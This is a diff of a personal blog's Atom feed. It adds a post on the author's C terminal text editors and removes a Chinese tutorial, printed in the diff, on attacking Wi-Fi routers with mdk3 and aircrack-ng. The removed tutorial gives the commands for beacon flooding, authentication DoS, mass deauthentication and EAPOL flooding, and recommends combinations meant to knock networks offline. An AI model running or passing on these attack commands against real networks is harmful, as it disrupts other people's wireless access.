@@ -1,4 +1,27 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2016-12-22T14:59:02+08:00</updated><id>//</id><title type="html">BLOG|LEXUGE</title><subtitle>This is a personal website.It is LEXUGE's BLOG.Welcome to my website!</subtitle><entry><title type="html">GAMEOX详述</title><link href="/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0.html" rel="alternate" type="text/html" title="GAMEOX详述" /><published>2016-12-17T13:39:00+08:00</published><updated>2016-12-17T13:39:00+08:00</updated><id>/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0</id><content type="html" xml:base="/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0.html">&lt;p&gt;&lt;strong&gt;GAMEOX详述&lt;/strong&gt;&lt;br /&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.3.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2016-12-22T19:53:11+08:00</updated><id>//</id><title type="html">BLOG|LEXUGE</title><subtitle>This is a personal website.It is LEXUGE's BLOG.Welcome to my website!</subtitle><entry><title type="html">LEDIT及EDIT简述</title><link href="/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html" rel="alternate" type="text/html" title="LEDIT及EDIT简述" /><published>2016-12-22T19:40:00+08:00</published><updated>2016-12-22T19:40:00+08:00</updated><id>/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0</id><content type="html" xml:base="/jekyll/update/2016/12/22/LEDIT%E5%8F%8AEDIT%E7%AE%80%E8%BF%B0.html">&lt;p&gt;&lt;strong&gt;LEDIT及EDIT简述&lt;/strong&gt;&lt;br /&gt;
+EDIT是LEXUGE用C语言制作的一款命令行文本编辑软件，目前功能简单&lt;br /&gt;
+LEDIT是LEXUGE在Linux下用纯C制作，不依赖任何非标准函数库的终端文本编辑软件，功能与EDIT一样&lt;br /&gt;
+上述两款软件全部遵守&lt;a href=&quot;http://www.gnu.org/licenses/gpl.txt&quot;&gt;GPL协议&lt;/a&gt;(以本文所述作为最后实际有效话语)&lt;br /&gt;
+两个版本书写的文档基本兼容&lt;br /&gt;
+下面是帮助：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;使用上，下，左，右键来移动光标&lt;/li&gt;
+  &lt;li&gt;使用Ctrl+w保存文件&lt;/li&gt;
+  &lt;li&gt;使用Ctrl+r打开文件&lt;/li&gt;
+  &lt;li&gt;使用ESC来退出(LEDIT需要两次ESC)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Copyright (“2015-2016”) LEXUGE&lt;/p&gt;</content><summary type="html">LEDIT及EDIT简述
+EDIT是LEXUGE用C语言制作的一款命令行文本编辑软件，目前功能简单
+LEDIT是LEXUGE在Linux下用纯C制作，不依赖任何非标准函数库的终端文本编辑软件，功能与EDIT一样
+上述两款软件全部遵守GPL协议(以本文所述作为最后实际有效话语)
+两个版本书写的文档基本兼容
+下面是帮助：
+
+  使用上，下，左，右键来移动光标
+  使用Ctrl+w保存文件
+  使用Ctrl+r打开文件
+  使用ESC来退出(LEDIT需要两次ESC)</summary></entry><entry><title type="html">GAMEOX详述</title><link href="/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0.html" rel="alternate" type="text/html" title="GAMEOX详述" /><published>2016-12-17T13:39:00+08:00</published><updated>2016-12-17T13:39:00+08:00</updated><id>/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0</id><content type="html" xml:base="/jekyll/update/2016/12/17/GAMEOX%E8%AF%A6%E8%BF%B0.html">&lt;p&gt;&lt;strong&gt;GAMEOX详述&lt;/strong&gt;&lt;br /&gt;
 Copyright (“2015-2016”) LEXUGE&lt;br /&gt;
 The software is using &lt;a href=&quot;http://www.gnu.org/licenses/gpl.txt&quot;&gt;GPLv3&lt;/a&gt;&lt;/p&gt;
 
@@ -276,136 +299,4 @@ tc
 &lt;/div&gt;
 &lt;p&gt;OK,可以编写程序进行测试，如果不行，可以&lt;strong&gt;更改函数库路径&lt;/strong&gt;解决&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;祝你成功！&lt;/strong&gt;&lt;/p&gt;</content><summary type="html">Turbo C是美国Borland公司的产品，Borland公司是一家专门从事软件开发、研制的大公司。该公司相继推出了一套 Turbo系列软件, 如Turbo BASIC, Turbo Pascal, Turbo Prolog, 这些软件很受用户欢迎。</summary></entry><entry><title type="html">使用mdk3+aircrack-ng攻击路由器</title><link href="/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html" rel="alternate" type="text/html" title="使用mdk3+aircrack-ng攻击路由器" /><published>2016-08-28T11:47:00+08:00</published><updated>2016-08-28T11:47:00+08:00</updated><id>/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8</id><content type="html" xml:base="/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html">&lt;blockquote&gt;
-  &lt;p&gt;mdk3是一款Linux下的终端网络攻击工具，需要配合强大的aircrack -ng使用&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/charlesxsh/mdk3-master&quot;&gt;mdk3-Github&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://github.com/LEXUGE/mdk3-master&quot;&gt;mdk3-Github|LEXUGE’s fork&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;http://www.aircrack-ng.org/index.html&quot;&gt;aircrack -ng&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;现在mdk3的官网已经关闭了，在Github上还有mdk3 v6的原版改进版，为防止项目被删除，我也fork了一份，供大家备用下载。&lt;br /&gt;
-mdk3的攻击过程中是不需要网络连接的，也就是在无网络的状态下攻击，希望大家不要恶意攻击他人，保持好自己的黑客道德。&lt;br /&gt;
-教程在Fedora Linux下通过测试&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iwconfig&lt;/code&gt;&lt;br /&gt;
-使用该命令来检查是哪一个接口来支持无线连接的，如我的就是wlp2s0&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iw dev wlp2s0 scan&lt;/code&gt;&lt;br /&gt;
-用这个命令来扫描周围的Wi-Fi信息，SSID为路由器的名称，BSS为路由器的MAC地址&lt;strong&gt;（注意，截至目前，我们不需要安装任何软件）&lt;/strong&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dnf install aircrack-ng.x86_64&lt;/code&gt;&lt;br /&gt;
-现在我们来安装mdk3和aircrack-ng(aircrack-ng可能名称会发生变动，具体请使用&lt;code class=&quot;highlighter-rouge&quot;&gt;$ dnf search aircrack-ng&lt;/code&gt;搜索软件包)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /mdk3-master
-make
-sudo make install
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
-    &lt;p&gt;下载完mdk3并解压完毕后，即可进行编译安装，在&lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt;时会有gcc的编译警告，忽略即可，不必担心&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;5.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /usr/local/sbin
-./mdk3
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;如果正确安装就可以看到mdk3输出的帮助&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;安装过程到此就完毕了&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;现在，我们来介绍如何攻击&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;su
-airmon-ng start {你的接口，在第一步中可以找到}
-cd /usr/local/sbin
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;第二条命令时，系统会自动关闭冲突进程，在最后会有监听端口，&lt;strong&gt;注意，接下来的mon0就使用监听端口代替&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;第一种模式：&lt;br /&gt;
-beacon flood mode：&lt;br /&gt;
-     这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。&lt;br /&gt;
-详细命令如下：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 b 
-
-      -n &amp;lt;ssid&amp;gt;        #自定义ESSID
-      -f &amp;lt;filename&amp;gt;            #读取ESSID列表文件
-      -v &amp;lt;filename&amp;gt;           #自定义ESSID和BSSID对应列表文件
-      -d         #自定义为Ad-Hoc模式
-      -w         #自定义为wep模式
-      -g           #54Mbit模式
-      -t            # WPA TKIP encryption
-      -a           #WPA AES encryption
-      -m          #读取数据库的mac地址
-       -c &amp;lt;chan&amp;gt;                   #自定义信道
-       -s &amp;lt;pps&amp;gt;                #发包速率
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;第二种模式：&lt;br /&gt;
-Authentication DoS：&lt;br /&gt;
-这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在reaver穷据路由PIN码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由！&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 a
-      -a &amp;lt;ap_mac&amp;gt;              #测试指定BSS
-      -m              #使用有效数据库中的客户端mac地址
-      -c          #对应 -a ，不检查是否测试成功
-      -i  &amp;lt;ap_mac&amp;gt;           #对指定BSS进行智能攻击
-      -s &amp;lt;pps&amp;gt;               #速率，默认50
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;第三种模式：&lt;br /&gt;
-Deauthentication/Disassociation Amok：&lt;br /&gt;
-强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击……可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击！&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mdk3 mon0 d
-      -w &amp;lt;filename&amp;gt;             #白名单mac地址列表文件
-      -b &amp;lt;filename&amp;gt;              #黑名单mac地址列表文件
-      -s &amp;lt;pps&amp;gt;                        #速率，这个模式下默认无限制
-      -c [chan,chan,chan,...]                  #信道，可以多填，如 2,4,5,1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;第四种模式：&lt;br /&gt;
-802.1X test:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mdk3 mon0 x  
-      0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击
-
-            -n &amp;lt;ssid&amp;gt;               
-            -t &amp;lt;bssid&amp;gt;        #目标客户端的mac地址               
-
-            -w &amp;lt;WPA type&amp;gt;
-               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)
-            -u &amp;lt;unicast cipher&amp;gt;
-               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
-            -m &amp;lt;multicast cipher&amp;gt;
-               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
-            -s &amp;lt;pps&amp;gt;      #速率，默认400               
-      1 - EAPOL Logoff test       #注销认证攻击
-            -t &amp;lt;bssid&amp;gt;        #目标客户端的mac地址             
-            -c &amp;lt;bssid&amp;gt;         #目标ap的合法客户端mac               
-            -s &amp;lt;pps&amp;gt;         #速率，默认400               
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;最后，建议这样攻击：&lt;br /&gt;
-第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合第四种进行攻击，会导致路由器死亡&lt;br /&gt;
-分别是&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 b
-./mdk3 mon0 d -s 120
-./mdk3 mon0 a -a {你要攻击的路由器MAC(BSS)}
-./mdk3 mon0 x 1 -c {客户端MAC(虚拟)} -t {路由器MAC(BSS)}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;祝你成功！&lt;/p&gt;</content><summary type="html">mdk3是一款Linux下的终端网络攻击工具，需要配合强大的aircrack -ng使用</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;祝你成功！&lt;/strong&gt;&lt;/p&gt;</content><summary type="html">Turbo C是美国Borland公司的产品，Borland公司是一家专门从事软件开发、研制的大公司。该公司相继推出了一套 Turbo系列软件, 如Turbo BASIC, Turbo Pascal, Turbo Prolog, 这些软件很受用户欢迎。</summary></entry></feed>
